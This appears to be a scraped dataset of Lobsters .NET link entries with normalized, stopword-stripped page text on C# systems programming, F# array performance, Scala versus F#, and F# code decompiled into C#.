instruction cycle historically writing system meant interacting hardware writing c system longer domain c unsafe code c productivity ease use found higher level language like c lambda security worse ever builtin safety fewer inherent security reliability risk buffer overrun account approximately known day vulnerability using language like c go inherent memory risk security exploit like crosssite scripting still possible least eliminated entire class exploit c also includes powerful async concurrency model lot momentum behind c lot resource tool available developer big challenge taking knowledge momentum behind c extending multiple platform c reason use c include garbage collection gc allocationrich apis pattern error model make reliability challenging concurrency based unsafe multithreading joe duffy encourages developer try go rust order compare contrast feature set c lot sharing idea take place across community talk focus microsoft making progress existing issue problem system program new c library feature pattern apply today including enforce roslyn analyzer advance code generation technology open source using github codeveloped community performance low level code quality performance jit compilation bad system program ca nt spend enough time optimization kind optimization compiler dumbed speed compilation speed resulting code important factor ahead time aot compilation depending upon debug release build may spend time optimizing look c v c code could see huge variance code quality may also security concern code generated run time build code ahead time ensure sealed modified aot compiled code found c net window app store requires code compiled way prior allowed store result nt need run jit compiler runtime improves performance startup time mobile apps nt think jit aot two completely different model dial adjust required let system decide compiler compile code code generation two different compiler used code generation c ryujit llvm opensource highly optimized compiler llilc intermediate language il translator llvm install new clr using ready run version resilient image format allows version resiliency expense code quality coreclr corert runtimes open source run top window mac o x linux others optimization inlining super important historically something jit compiler good job historically optimization domain language like c result received bad reputation code quality performance including optimization code quality increased closer onpar c c inlining function call cheap new stack frame save return address save register might overwritten call restore add lot waste leaflevel function cycle range analysis area c used struggle compared c bound checking wo nt execute loop body bound array loop obviously never go bound naïve compiler induction check elemslength plus bound check elems every iteration stack allocation looking see alexander hamilto one customer u lambda expression look indexof two object get allocated stack short lived function emits code result many people midori project using lambda based apis unfortunate people like write code c instead compiler automatic escape analysis compiler use knowledge stack allocate object still object compiler put stack cheap execute great compiler perform analysis wanted control using new preview feature called scoped compiler tell anything prevent optimization taking place memory memory speed kept pace processor speed latency number every programmer know include main memory expensive access take io dwarf garbage collection time expensive io also worse expand consume available space garbage collection net multigenerational compacting garbage collection concurrent background scanning automatically reduce pause time server workload net use concurrent parallel garbage collection harmony garbage collection pitfall object die generation live longer unnecessarily result expensive operation midlife crisis object died generation live generation could add millisecond latency application spending time garbage collecting bad thing time spent garbage collecting time application spending working big data program may spend lot time garbage collection multithreading complicates thing code may perform well isolation action may execute parallel gc execute sooner may promote object later gc generation c value c two major type kind structs class stucts improve memory performance result le gc pressure better memory locality le overall space usage beware copying large byte structs essentially equivalent memcpy byrefs used minimize copying ref return new feature c new feature next release c net valuetask valuetuple others valuetask return thin wrapper compiler aware optimal string array string array often subject premature graduation especially big data scenario stringsplit allocates array n string copying data lingq query allocates enumer object toarray allocates least array dynamically grows span span used lot midori span struct slice array string native buffer another span key never make bigger uniform access available regardless creation access safe bound checked pack small array often end gc heap needlessly pack fixed size structbased array interoperates span apis ideal temporary allocation zero copy copy memory needlessly byte almost always sign danger native memory keep spanprimitive make convenient work byte safe way reliability exception meant recoverable error many error recoverable bug error programmer nt expect recoverable error expected condition resulting programmatic data validation treating bug recoverable error homogeneously creates reliability problem failfast know going fail fast possible place exception delay inevitable invite abuse failfast ensures bug caught promptly damage microsoft experience ratio recoverable error exception bug failfast contract asserts microsoft providing api developer call code api called environmentfailfast exists log current stack trace tear process part industry also moving failfast including c programmer microsoft edge browser us failfast speech server cortana ported midori discovered test case failing taiwanese production speech request failfast implemented error became visible failfast api used debug mode immutability immutability improve concurrencysafety reliability accidental mutation performance enables compiler optimization c readonly mean memory location changed immutable structure one readonly field deeply immutable structure one readonly field field refers another immutable structure including primitive language mentioned people mentioned see presentation show note recorded aug
474,Lobsters,dotnet,"C#, F#, .NET programming",F# for Fun and Profit,https://www.gitbook.com/book/swlaschin/fsharpforfunandprofit/details,f fun profit,please log preview content,please log preview contentyou still access book content using read button
475,Lobsters,dotnet,"C#, F#, .NET programming",Adventures in F# Performance,https://jackmott.github.io//programming/2016/08/13/adventures-in-fsharp.html,adventure f performance,simd array library jared hester microsoft f repo core array library blog post arrayfilter asik update asik new filter merged interesting solution paul westcott apply predicate twice performance test result filtering random double ryujit arraypartition performance test result partitioning random int array predicate adventure il dissasembly sometimes compile strangely badly ilspy loop pattern beware net performance test result bound check elision mapping function delving parallel read documentation performance test result predicate recursion slower sometimes note benchmarking benchmarkdotnet mean fsharp result,apology functional programming enthusiast follows lot imperative code say array library working f simd array library learning nice bench marking tool net thanks jared hester got idea try contributing f core library poking around official microsoft f repo modeling simd library core array library duplicating relevant function simd form got familiar code saw function thought could speed steffen forkmann pointed blog post get started building contributing fsharp language got work arrayfilter first function thought could improve mostly wrong arrayfilter take array predicate function argument applies function element array resulting array contains element satisfy predicate original implementation used list net collection similar c vector array backed list double size add item fill time fill allocate whole new array discard old one lead worst case scenario array length exceeds power like element filtered end allocating element needed allocate another copy array list best case allocate handful byte list overhead everything filtered let filter f array checknonnull array array let re list resizearray arraylength let x array f x resadd x restoarray tried thing settled let filter f array checknonnull array array let temp arrayzerocreateunchecked arraylength let mutable c f array temp true c c let result arrayzerocreateunchecked c c let mutable c resultlength temp result c array c c result allocates array booleans length input front usually stored byte net common case pointer int float array element allocate array size extra data instead reducing gc pressure big win garbage collected language seemed like good thing gotchas though loop branch branch pattern sometimes random branch prediction miss slow performance advantage go negative compared original implementation size array type shrink case thing filtered distribution element somewhat random whether get filtered performance sometimes worse performance also differed v bit build different machine benchmarking really hard account different array type size length different distribution filtering amount filtering always win hard decide really better asik suggested solution ended final answer let filter f array checknonnull array array let re arrayzerocreateunchecked arraylength let mutable count x array f x re count x count count arraysubunchecked count re allocates entire array whatever type input add element us arraysub call fast native code copy sub section array new one always faster original core lib solution sometimes allocated memory microsoft guy considered net win took improvement varied lot usually around faster worst case performance would large array type like byte struct element likely get filtered might want roll filter optimization applied similar arraychoose function update asik collaborated got new filter merged keep speed solution reducing allocation average implementing growing array hand taking advantage extra knowledge like upper bound size arraylength trick another interesting solution proposed paul westcott us bit array may reduce allocation yet maintaining similar rerformance pretty cool aside predicate pure function fast function apply predicate twice avoid extra allocation fast sufficiently simple predicate like comparison performance test result filtering random double ryujit method median stddev gen gen gen byte allocatedop corefilter m m arrayfilter m m arraypartition happy filter optimization felt like someimtes taking memory hit great started scanning library opportunity came across arraypartition take array predicate returning tuple two array one array contains every element true every element false let partition f array checknonnull array array let list resizearray let list resizearray arraylength let x array f x x else x respect array backed list solution failing get clear win using raw array filter tried look something clever realized one invariant result always size input input element output element fundamentally need use data structure grows thought creating struct could tag element true false first pas copy result two output array still waste arraylength byte memory great idea maybe best idea allocate array size type input put true element left false element right memory wasted extra int keep track one set end begin copy left side array first result reverse right side array second result let partition f array checknonnull array array let re arrayzerocreateunchecked arraylength let mutable upcount let mutable downcount x array f x re upcount x upcount upcount else re downcount x downcount downcount let arraysubunchecked upcount re let arrayzerocreateunchecked arraylength upcount downcount re downcount downcount downcount performance test result partitioning random int array predicate fun x x method arraylength median stddev scaled gen gen gen byte allocatedop partition n n newpartition n n partition n n newpartition n n partition n n newpartition n n adventure il dissasembly one performance drawback managedsafe language array bound checking prevents accidentally wandering end array writing memory random useful feature come performance cost end eating cpu cycle checking array bound time loop net jit identify case bound check eliminated take care structure loop right missed f added confusion since loop different syntax c sometimes compile strangely badly peek byte code c equivalent representation tool like ilspy instance loop let len arraylength stuff compiles c equivalent int num len num stuff num madness maybe madness get jitted away definitely cause array bound elision missed slowing pattern used many place core array library went mechanistically replaced pattern work stuff becomes c equivalent int arraylength stuff ahhhh much better get array bound elision jit impact change pretty big case function applied per array element simple array bound checking make sizeable total run time case small impact arraymap fun x sieveoferatosthenes x going noticeably better impacted almost function array module assume dangerous would take overhead jiting il well want know sure loop want jits differ bit one differ mono etc need view dissasembly visual studio get debug window disassembly program running example code without bound check since process done jit always control sometimes massage code sure jit right thing sometimes get desperate write function c using unsafe loop call f loop pattern beware net lops go anything le array length get bound check elided loop go backwards get array bound checking elided loop array f stride length something compiler generates loop us enumerator much slower generates garbage use loop tail recursion instead loop array class member miss array bound elision make function local copy array reference first x array syntax f work fine may performance consideration normal loop generated bound checking elided thing true ryujit net f actively worked could improve soon performance test result bound check elision arraymap mapping function fun x x method length median stddev scaled old n n new n n old n n new n n delving parallel array module sub module parallel arrayparallelmap instance use parallelfor loop multithread map operation scanning saw parallelpartition let partition predicate array checknonnull array array let inputlength arraylength let lastinputindex inputlength let istrue arrayzerocreateunchecked inputlength parallelfor inputlength fun istrue predicate array ignore let mutable truelength lastinputindex istrue truelength truelength let trueresult arrayzerocreateunchecked truelength let falseresult arrayzerocreateunchecked inputlength truelength let mutable itrue let mutable ifalse lastinputindex istrue trueresult itrue array itrue itrue else falseresult ifalse array ifalse ifalse trueresult falseresult stuck iterating entire istrue array second time order count many true element struck fundamentally unnecessary tried creating accumulation variable parallelfor call incrementing within loop nope add parallel like safely perhaps architecture worked sometimes always remembered systemthreadinginterlockedincrement provides thread safe way increment int worked slow scalar version function since every thread constantly locking increment function read documentation sometimes stuff awful read func action tlocal pc load letter go slow stare start make sense key info parallelfor loop internally keep track accumulator let u track total number true element without iterating array new solution becomes let partition predicate array checknonnull array array let inputlength arraylength let istrue arrayzerocreateunchecked inputlength let mutable truelength parallelfor inputlength fun fun truecount predicate array istrue true truecount else truecount action int fun x systemthreadinginterlockedadd truelength x ignore ignore let arrayzerocreateunchecked truelength let arrayzerocreateunchecked inputlength truelength let mutable itrue let mutable ifalse istrue itrue array itrue itrue else ifalse array ifalse ifalse case thread accumulator value keeping track truecount free increment without locking thread finish locked add adding personal truecount final result stored truelength locked add happens numthreads time instead arraylength time cause terrible performance penalty final result faster memory use penalty performance test result arrayparallelpartition predicate fun x x method length median stddev scaled gen gen gen byte allocatedop original u u new u u original u u new u u original u u new u u original u u new u u original u u new u u recursion slower sometimes sometimes recursive implementation substantive speed hit f compiler good tail recursion optimization turning recursive function nice loop still small medium performance penalty case example arraycomparewith got faster converted recursive implementation loop let inline comparewith comparer int checknonnull checknonnull let let let minlength operatorsmin let rec loop index index minlength elif else else let result comparer index index result result else loop loop took care realize performance improvement early attempt actually worse keep mind testing il inspection necessary know sure recursive implementation problem often note benchmarking benchmarking managed code easy well dealing non deterministic hardware operating system like cc also add complication jit runtime garbage collection thing cause code run faster one moment slower next especially looking marginal gain easily fool thinking made progress actually regressed vice versa also may achieved slight runtime improvement function generated garbage collected leading net loss maybe thrashed cache new algorithm next function go slower run context full program hard identify benchmark cringe bit see people say optimize later identify bottleneck identifying bottleneck hard see easy way avoid pointer hopping creating garbage take used benchmarkdotnet library help solve challenge automatically warm jit figure many trial need run test get good data report memory usage gc event though feature bug careful also spit nice report result html csv markdown format markdown format handy paste pull request see sample stub used interested improving quality performance software world consider something need highly skilled experienced average web developer day language architect assembler expert anything need patience learning given project repository build process work often hardest part ask question community worry seeming dumb get le dumb every time ask dumb question pick favorite open source language library make better code base huge even written grey beard wizard mistake bottleneck find fix code base way head start improving documentation error message important glamorous work always highly appreciated way familiarize project endear team member plus also make world better place mean fsharp net effect f program vary considerably change working need making use array learn cache miss pr people performance improvement area great see using array using core library array module thing go faster whether make substantive difference depends use case fun put together toy example hit lot key function sped compared current core lib hopefully get merged init create map faster due array bound check elision let arrayinit tenmillion fun let arraycreate tenmillion let added fun x xy rev faster due array bound elision micro optimization let backwards added arrayrev averageby much faster longer call seqaverageby let average backwards arrayaverageby fun x float x use aggregating parallelfor loop let backwards arrayparallelchoose fun x match x x x x none partition faster us le memory due new algorithm let even odd arraypartition fun x x filter faster due using preallocated array instead list let filtered even arrayfilter fun x x result host process environment information osmicrosoft window nt processorintel r core tm cpu tick n timertsc clrmsnet release ryujit gcconcurrent workstation typesimdbenchmark modethroughput jitryujit garbagecollectionconcurrent workstation method length median stddev gen gen gen byte allocatedop old u u new u u old u u new u u old u u new u u old u u new u u old u u new u u
477,Lobsters,dotnet,"C#, F#, .NET programming","Ulterius, complete control of your desktop — from your browser.",https://ulterius.xyz/,ulterius complete control desktop browser,,completely free ad additional purchase secure design committed privacy pc game string attached
478,Lobsters,dotnet,"C#, F#, .NET programming",F#: Type Providers from the Ground Up,https://www.youtube.com/watch?v=pXT0li6zxKQ,f type provider ground,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature type provider ground youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature type provider ground youtube
479,Lobsters,dotnet,"C#, F#, .NET programming",Comparing Scala to F#,http://mikhail.io/2016/08/comparing-scala-to-fsharp/,comparing scala f,functional programming scala specialization implicit parameter underscore lambda tailrecursion mark call name lack type inference functional v objectoriented style usage operator partial application singledirection dependency conclusion reddit lobster,f scala quite similar language foot view functionalfirst language developed virtual machine imperative language dominate c net java jvm still lingua franca alternative getting stronger background net ecosystem f first two started learning time scala seems traction largely due successful product framework like spark akka play decided broaden skill set pick scala knowledge started functional programming scala specialization coursera following coursera note language feature scala find interesting vice versa missing compared f particular order want share note scala v f blog post post updated based comment mark lewis giacomo citi implicit parameter parameter function marked implicit def work implicit int print mean call function without specifying value parameter compiler try figure value according extensive set rule eg implicit val v somewhere work print aware similar feature language know pretty sure understand well enough yet time think implicits characteristic scala powerful tool used many valid scenario abused shoot one foot underscore lambda underscore used represent parameter lambda expression without explicitly naming employeessortby dateofbirth think brilliant short readable tuple value represented sort array tuples like profitbyyearsortby look bit hairy probably used meaning obvious example sure sort year f underscore used different sense something ignore make sense would love shorter way writing lambda empoyees listsort fun e edateofbirth hint tailrecursion mark recursive function scala marked tailrec annotation would result compilation error function tailrecursive guarantee get nasty stack overflow exception tailrec def boom x int int x else boom code compile recursion optimized compiler feature sound reasonable although must admit never needed f code yet call name call function f parameter value evaluated function body style function substitution model known call value default scala alternative defer evaluation parameter marking symbol def callbyname x int println x x style known call name evaluation defered parameter actually used parameter never used value never evaluated code val option int val b getorelse set b error thrown even though dividing zero function parameter parameter getorelse passed name f alternative defaultarg work way following code blow let let b defaultarg b boom get deferred evaluation passing function let defaultargfunc f unit match v v none f let defaultargfunc fun essentially happens scala scala syntax arguably cleaner lack type inference slowly moving towards language design flavour start type inference scala type inference seems quite limited yes explicitly define type local value time function return type def max int b int b else b specify type input parameter quite bummer people used short typeless code f haskell ocaml others matter type inference f play another significant role automatic type generalization f compiler would make type generic possible based implementation let max b b else b type function people make generic getgo compiler help case functional v objectoriented style f scala running top managed objectoriented virtual machine time language enable developer write functional code functional programming mean operating immutable data structure pure free side effect operation without questioning find pure functional scala code written much objectoriented style compared f class object ubiquitous scala example given martin odersky course f example refrain class unless needed f official guidance never expose nonabstract class f api scala really heavy inheritance even introduced quasimultiple inheritance trait stream inherits list nothing subtype every type used covariance trick operation usually defined class method instead separate function example following scala code word filter c cisletter would filter string letter isletter defined method char think essential type usage operator look like scala culture incline towards usage different operator arithmetic operation also different class standard library domainspecific code basic one nice eg list concatenation others look awkward eg stream concatenation akka stream sweetness bcast merge bcast merge go quite extreme similar scalaz library default would use operator unless sure every reader able instantly understand mean partial application huge difference f function curried default scala function thus f partial application work time let add b b let add let sum scala function def add int b int b curried underscore come rescue val int int add val sum note miss type inference parameter order important f short syntax partially apply parameter left right scala put position give flexibility singledirection dependency f compiler allow circular dependency use function defined expert f book say managing dependency circularity one difficult fundamental problem good software design file f project presented f compiler compilation order construct earlier file refer declaration later file mechanism enforce layered design software carefully organized layer one layer refer layer cyclic way help write code reusable organized component possible independent combined tangle spaghetti code think huge f force structure code way avoid mutual dependency different function type module reduces complexity coupling make developer avoid design pitfall nothing like scala conclusion course cover distinction instance active pattern type provider computation expression f type class higher kinded type macro scala obviously scala f capable language still picking basic similar many aspect made several different choice along language design tradeoff p overheard twitter f bad language attached bad opposite scala actually update thanks everyone great comment please check reddit lobster see
480,Lobsters,dotnet,"C#, F#, .NET programming","F# decompiled into C# (Or, what C# code do you have to write to get the same functionality as F#?)",https://fsharpforfunandprofit.com/posts/fsharp-decompiled/,f decompiled c c code write get functionality f,available github ilspy content record type class discriminated union type module pattern matching generated c code file ilspy like record type simple immutable record type source finalgamescorecs question mutable record source updatablegamescorecs adding extra method property full source personcs class simple class source productcs class custom equality source entitycs class hierarchy discriminated union singlecase union primitive obsession source productidcs style union source colorcs real enum example complex union type module type defined module submodules pattern matching simple pattern matching nested matching pattern matching parameter list pattern matching typetesting pattern matching summary available github comment comment powered disqus blog comment powered,complete code post available github favorite trick f proponent take f code compile decompile result c using tool ilspy show c code would write get functionality f code generally f code much shorter equivalent c code due thing like oneline type definition lack curly brace however find many concrete example kind decompilation web thought would put together demonstration reference content post cover possible f code example show example lambda partial application end looking messy decompiled rather focus two core thing basic type definition standalone function module grouped example follows record type example immutable mutable record type type extra property method class example basic class one custom equality interface abstract base class concrete subclass discriminated union type example singlecase union used wrapper set choice complex example extra data choice module example simple function also submodule pattern matching show code generated various kind pattern matching generated c code write c code scratch instead used following process created f type file compiled dll opened dll ilspy decompiled code c f type created corresponding c class tweaked c code make idiomatic using autoproperties removing duplicate code renaming variable etc also added explanatory comment needed next used resharper tweaked c code r happy final c code look something like note goal create perfect c code preserve f compiler output much possible without giving c devs many conniption record type f type contain field property defined record type rather class start simple immutable record type example simple immutable record f comment attached type property example simple immutable record type finalgamescore game property game string finalscore property finalscore int c equivalent generated code would look like discus code detail summary example simple immutable record summary serializable public sealed class finalgamescore iequatable finalgamescore istructuralequatable icomparable finalgamescore icomparable istructuralcomparable summary game property summary public string game get internal set summary finalscore property summary public int finalscore get internal set summary constructor summary public finalgamescore string game int finalscore thisgame game thisfinalscore finalscore summary needed custom equality summary public int gethashcode iequalitycomparer comp var num const int offset num offset thisfinalscore num num var game thisgame return offset game null gamegethashcode num num summary needed custom equality summary public override int gethashcode return thisgethashcode languageprimitivesgenericequalitycomparer summary implement custom equality summary public bool equal finalgamescore obj return obj null stringequals thisgame objgame thisfinalscore objfinalscore summary implement custom equality summary public override bool equal object obj var finalgamescore obj finalgamescore return finalgamescore null thisequals finalgamescore summary implement custom equality summary public bool equal object obj iequalitycomparer comp ignore iequalitycomparer simplification generated f code complex return equal obj summary implement custom comparison summary public int compareto finalgamescore obj obj null return int num stringcompareordinal thisgame objgame num return num return thisfinalscorecompareto objfinalscore summary implement custom comparison summary public int compareto object obj return thiscompareto finalgamescore obj summary implement custom comparison summary public int compareto object obj icomparer comp ignore icomparer simplification generated f code complex return thiscompareto finalgamescore obj source finalgamescorecs go generated c code section first thing notice generated code implement number interface public sealed class finalgamescore iequatable finalgamescore istructuralequatable icomparable finalgamescore icomparable istructuralcomparable particular override equality generic one object iequatable comparison icomparable icomparable also istructuralequatable istructuralcomparable detail see question first part class body similar would write two getonly property constructor summary game property summary public string game get internal set summary finalscore property summary public int finalscore get internal set summary constructor summary public finalgamescore string game int finalscore thisgame game thisfinalscore finalscore note f code generates internal set property rather private one since code assembly f special behavior getter setter make practical difference next section implement gethashcode three kind equal summary needed custom equality summary public int gethashcode iequalitycomparer comp var num const int offset num offset thisfinalscore num num var game thisgame return offset game null gamegethashcode num num summary needed custom equality summary public override int gethashcode return thisgethashcode languageprimitivesgenericequalitycomparer summary implement custom equality summary public bool equal finalgamescore obj return obj null stringequals thisgame objgame thisfinalscore objfinalscore summary implement custom equality summary public override bool equal object obj var finalgamescore obj finalgamescore return finalgamescore null thisequals finalgamescore summary implement custom equality summary public bool equal object obj iequalitycomparer comp ignore iequalitycomparer simplification generated f code complex return equal obj code generated third equal method using iequalitycomparer almost duplicate primary equal method make comparison fairer like code someone would write hand removed replaced call primary equal method finally various kind comparison implemented removed duplicated logic tidied code bit idiomatic summary implement custom comparison summary public int compareto finalgamescore obj obj null return int num stringcompareordinal thisgame objgame num return num return thisfinalscorecompareto objfinalscore summary implement custom comparison summary public int compareto object obj return thiscompareto finalgamescore obj summary implement custom comparison summary public int compareto object obj icomparer comp ignore icomparer simplification generated f code complex return thiscompareto finalgamescore obj might always need special equality comparison code generated case mark type noequalityattribute andor nocomparisonattribute see nocomparisonattribute used next example mutable record look would implement record one mutable property mutable currentscore without generating comparison code example simple mutable record nocomparisonattribute type updatablegamescore game property game string mutable currentscore property mutable currentscore int generated c code currentscore property setter well getter icomparable interface compareto implementation eliminated relevant excerpt serializable public sealed class updatablegamescore iequatable updatablegamescore istructuralequatable summary game property summary public string game get internal set summary mutable currentscore property summary public int currentscore get set summary constructor summary public updatablegamescore string game int currentscore thisgame game thiscurrentscore currentscore remaining code snipped source updatablegamescorecs adding extra method property finally often want add extra property method type example defined person type fullname property isbirthday method addition core property firstname lastname dateofbirth definition person type person store first name firstname string store last name lastname string store date birth dateofbirth datetime fullname property member thisfullname thisfirstname thislastname isbirthday method member thisisbirthday datetimetodaymonth thisdateofbirthmonth datetimetodayday thisdateofbirthday first part generated c code look like summary definition person summary serializable public sealed class person iequatable person istructuralequatable icomparable person icomparable istructuralcomparable summary store first name summary public string firstname get internal set summary store last name summary public string lastname get internal set summary store date birth summary public datetime dateofbirth get internal set summary constructor summary public person string firstname string lastname datetime dateofbirth thisfirstname firstname thislastname lastname thisdateofbirth dateofbirth summary fullname property summary public string fullname get return thisfirstname thislastname summary isbirthday method summary public bool isbirthday return datetimetodaymonth thisdateofbirthmonth datetimetodayday thisdateofbirthday remaining code snipped course usual extra code equality comparison one piece summary implement custom equality summary public bool equal person obj return obj null stringequals thisfirstname objfirstname stringequals thislastname objlastname languageprimitiveshashcomparegenericequalityerintrinsic thisdateofbirth objdateofbirth languageprimitives namespace come f core library contains helper code hashing equality testing comparison etc full source personcs class sometimes need inheritance oo feature see f class look like c simple class simple class product one immutable property id two mutable property secondary constructor two method static property containing constant example simple class type product id name price immutable id property member thisid id mutable name property member val name name get set mutable price property member val price price get set secondary constructor new id name product id name productdefaultprice true price member thisisexpensive thisprice example method member thiscanbesoldto countrycode match countrycode u ca uk true ru false false others example static property static member defaultprice look like generated c summary example simple class summary serializable public class product summary immutable id property summary public object id get internal set summary mutable name property summary public object name get set summary mutable price property summary public double price get set summary true price gt summary public bool isexpensive get return thisprice summary example static property summary public static double defaultprice get return summary primary constructor summary public product object id object name double price thisid id thisprice price thisname name summary secondary constructor summary public product object id object name id name defaultprice summary example method summary public bool canbesoldto string countrycode stringequals countrycode u stringequals countrycode ca stringequals countrycode uk return stringequals countrycode ru false return true source productcs see generated code longer implement iequatable icomparable make much shorter one thing note pattern matching f version canbesoldto method unrolled series statement c since c pattern matching generated code look mostly would expect class custom equality happens want class custom implementation equality say entity class compare using id example custom equality type entity id int name string immutable id property member thisid id mutable name property member val name name get set implement custom equality override thisequals obj match obj entity ent thisid entid null checking needed false case needed custom equality override thisgethashcode hash thisid implement custom equality interface iequatable entity member thisequals ent thisid entid null checking needed note annotated class constructor type entity id int name string force id int name string corresponding generated c summary example custom equality summary serializable public class entity iequatable entity summary immutable id property summary public int id get internal set summary mutable name property summary public string name get set public entity int id string name thisid id thisname name summary implement custom equality summary public override bool equal object obj var entity obj entity entity null return false return thisid entityid summary needed custom equality summary public override int gethashcode return thisid summary implement custom equality summary bool iequatable entity equal entity ent return thisid entid code look like standard c code source entitycs class hierarchy finally look oo code f c start interface interface type ishape abstract name string abstract draw unit unit generated c similar summary interface summary public interface ishape string name get void draw next define abstract base class implement ishape name property concrete subclass expected provide draw method abstract base class abstractclass type shapebase name self concrete implementation name property member thisname name abstract definition draw method abstract draw unit unit explicit implementation interface interface ishape member thisname selfname member thisdraw selfdraw generated c summary abstract base class summary serializable public abstract class shapebase ishape summary explicit implementation interface summary public string name get internal set summary abstract definition draw method summary public abstract void draw protected shapebase string name thisname name finally subclass shapebase f concrete class square type square name size inherit shapebase name subclass specific property member thissize size concrete implementation draw method override thisdraw consolewrite square size size c summary concrete class square summary serializable public class square shapebase summary subclass specific property summary public int size get internal set public square string name int size base name thissize size summary concrete implementation draw method summary public override void draw consolewrite square size thissize source example discriminated union discriminated union feature c represented behind scene singlecase union start singlecase union typically used wrap primitive type avoid primitive obsession example singlecase union wrapper round primitive type productid productid int one nice thing f type get implementation equality comparison like record type mean generated c code going long ala summary example singlecase union wrapper round primitive summary serializable public class productid iequatable productid istructuralequatable icomparable productid icomparable istructuralcomparable summary implemented f union type used case summary public int tag get return summary property access wrapped value summary public int item get private set summary static public constructor summary public static productid newproductid int item return new productid item summary private constructor summary internal productid int item thisitem item summary needed custom equality summary public int gethashcode iequalitycomparer comp const int num return thisitem num num summary needed custom equality summary public sealed override int gethashcode return thisgethashcode languageprimitivesgenericequalitycomparer summary implement custom equality summary public bool equal productid obj return obj null thisitem objitem summary implement custom equality summary public sealed override bool equal object obj var productid obj productid return productid null thisequals productid summary implement custom equality summary public bool equal object obj iequalitycomparer comp ignore iequalitycomparer simplification generated f code complex return equal obj summary implement custom comparison summary public int compareto productid obj obj null return return thisitemcompareto objitem summary implement custom comparison summary public int compareto object obj return thiscompareto productid obj summary implement custom comparison summary public int compareto object obj icomparer comp ignore icomparer simplification generated f code complex return thiscompareto productid obj source productidcs fact equivalent c code long one reason primitive obsession common know personally much le likely create wrapper class c f effort involved anyway ignoring equality comparison code see meat implementation wrapper around item property along static constructor newproductid public class productid summary property access wrapped value summary public int item get private set summary static public constructor summary public static productid newproductid int item return new productid item summary private constructor summary internal productid int item thisitem item style union another common use discriminated union emulate enum example one three color example simple enum type color red green blue generates following c code summary example simple enum summary serializable public class color iequatable color istructuralequatable icomparable color icomparable istructuralcomparable public static class tag public const int red public const int green public const int blue singleton one enum internal static readonly color uniquered new color internal static readonly color uniquegreen new color internal static readonly color uniqueblue new color summary implemented f union type used case distinguish singleton summary public int tag get private set summary static method get one singleton summary public static color red get return uniquered public bool isred get return tag summary static method get one singleton summary public static color green get return uniquegreen public bool isgreen get return tag summary static method get one singleton summary public static color blue get return uniqueblue public bool isblue get return tag summary private constructor summary internal color int tag tag tag summary needed custom equality summary public int gethashcode iequalitycomparer comp return tag summary needed custom equality summary public sealed override int gethashcode return gethashcode languageprimitivesgenericequalitycomparer summary implement custom equality summary public bool equal color obj obj null return tag objtag return false summary implement custom equality summary public sealed override bool equal object obj var color obj color return color null equal color summary implement custom equality summary public bool equal object obj iequalitycomparer comp ignore iequalitycomparer simplification generated f code complex return equal obj summary implement custom comparison summary public int compareto color obj obj null return return tagcompareto objtag summary implement custom comparison summary public int compareto object obj return compareto color obj summary implement custom comparison summary public int compareto object obj icomparer comp ignore icomparer simplification generated f code complex return compareto color obj source colorcs c implementation creates set static singleton instance uniquered uniquegreen etc used everywhere else differentiated tag number real enum f also create enum assigning int value case like example real c enum type colorenum decompiled c definition exactly enum serializable public enum colorenum red green blue use time f main reason enum style suitable exhaustive pattern matching int cast enum f pattern matching always need wildcard case needed discriminated union version defined previous section example complex union type finally look complex union type say paymentmethod type cash check credit card might model like type checknumber checknumber int type cardtype mastercard visa type cardnumber cardnumber string paymentmethod cash check card nocomparisonattribute type paymentmethod cash need extra information cash check need checknumber check checknumber creditcard need cardtype cardnumber creditcard cardtype cardnumber note using nocomparisonattribute since expect sorting payment method decompiled c snippet result four toplevel class around line code see first need define class three helper type checknumber cardtype cardnumber example first line checknumber serializable public class checknumber iequatable checknumber istructuralequatable icomparable checknumber icomparable istructuralcomparable summary property access wrapped value summary public int item get private set summary static public constructor summary public static checknumber newchecknumber int item return new checknumber item summary private constructor summary internal checknumber int item thisitem item snipped rest file similar productid type cardnumber cardtype similar color main paymentmethod type going ignore equality comparison code focus implemented case represented inner class subclass paymentmethod inner class property store data associated case cash case associated data need one instance implemented static singleton tag used differentiate subclass help equality testing comparison core code summary paymentmethod cash check card summary serializable public abstract class paymentmethod iequatable paymentmethod istructuralequatable public static class tag public const int cash public const int check public const int creditcard summary private subclass cash need extra information represented singleton summary serializable internal class cash paymentmethod summary public subclass check need checknumber summary serializable public class check paymentmethod public checknumber item get private set internal check checknumber item item item summary public subclass creditcard need cardtype cardnumber summary serializable public class creditcard paymentmethod public cardtype get private set public cardnumber get private set internal creditcard cardtype cardnumber summary implemented f union type used case equality comparison summary public int tag get return creditcard check cash extra data implemented singleton instance internal static readonly paymentmethod uniquecash new cash summary static public constructor get singleton summary public static paymentmethod cash get return uniquecash public bool iscash get return cash summary static public constructor summary public static paymentmethod newcheck checknumber item return new check item public bool ischeck get return check summary static public constructor summary public static paymentmethod newcreditcard cardtype cardnumber return new creditcard public bool iscreditcard get return creditcard summary private constructor summary internal paymentmethod summary needed custom equality summary public int gethashcode iequalitycomparer comp cash const int offset var check check check null const int num return offset checkitemgethashcode comp num num var creditcard creditcard creditcard null var num num offset comp num num return offset comp num num return summary needed custom equality summary public sealed override int gethashcode return gethashcode languageprimitivesgenericequalitycomparer summary implement custom equality summary public bool equal paymentmethod obj obj null return false tag objtag return false var check null var check obj return var creditcard null var creditcard obj return return true summary implement custom equality summary public sealed override bool equal object obj var paymentmethod obj paymentmethod return paymentmethod null equal paymentmethod summary implement custom equality summary public bool equal object obj iequalitycomparer comp ignore iequalitycomparer simplification generated f code complex return equal obj comparison line f code generated c look like around line altogether true may method might need even still quite lot code write hand module look module f module standard technique grouping standalone function module moduleexample add two number let add x x add number let x x behind scene code implemented static method static class generated c code public static class moduleexample summary add two number summary public static int add int x int return x summary add number summary public static int int x return x type defined module f type also defined module module moduleexample define empty class inside module type something class end represented c inner class defined inside static module class public static class moduleexample snipped add serializable public class something public something submodules f module contain submodules example might want group function work finalgamescore type defined top post module moduleexample snipped add create submodule module gamefunctions open recordtypeexamples create game let creategame name gamename change score existing game let changescore newscore game game finalscorenewscore example higher order function let mapscore f game game finalscoref gamefinalscore generated c code becomes another inner static class public static class moduleexample snipped add summary create submodule summary public static class gamefunctions summary create game summary public static finalgamescore creategame string name return new finalgamescore name summary change score existing game summary public static finalgamescore changescore int newscore finalgamescore game return new finalgamescore gamegame newscore summary example higher order function summary public static finalgamescore mapscore fsharpfunc int int f finalgamescore game return new finalgamescore gamegame finvoke gamefinalscore couple thing note first f code never mention type finalgamescore inferred game finalscorenewscore code hand 